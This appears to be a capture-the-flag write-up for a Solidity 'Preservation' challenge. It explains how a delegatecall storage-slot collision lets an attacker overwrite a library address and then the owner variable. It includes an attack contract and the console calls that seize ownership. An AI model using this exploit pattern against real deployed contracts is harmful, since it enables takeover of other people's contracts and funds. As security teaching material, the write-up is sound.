We can attack this contract using `setFirstTime()` or `setSecondTime()`. `LibraryContract ` should be marked as liblary, but is marked as contract so it can have storage.
Delegate call executes calling logic on caller contrage storage. So calling one of `setTime()` we can override address to point to our contract. Using the same vulnerability  
we can override owner variable.

Firstly we need to create and deploy contract that will override owner variable:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; // owner variable must have the same memory slot as variable is Preservation contract

    event SetTimerEmitted(address sender);

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
```

If contract is deployed we need to call fallowing function from `Preservation` contract.

```
await contract.setFirstTime('HACK_PRESERVATION_ADDRESS') // that will override timeZone1Library variable to address of our contract
await contract.setFirstTime(2137) // call to our contract, will override owner variable in Preservation contract
```
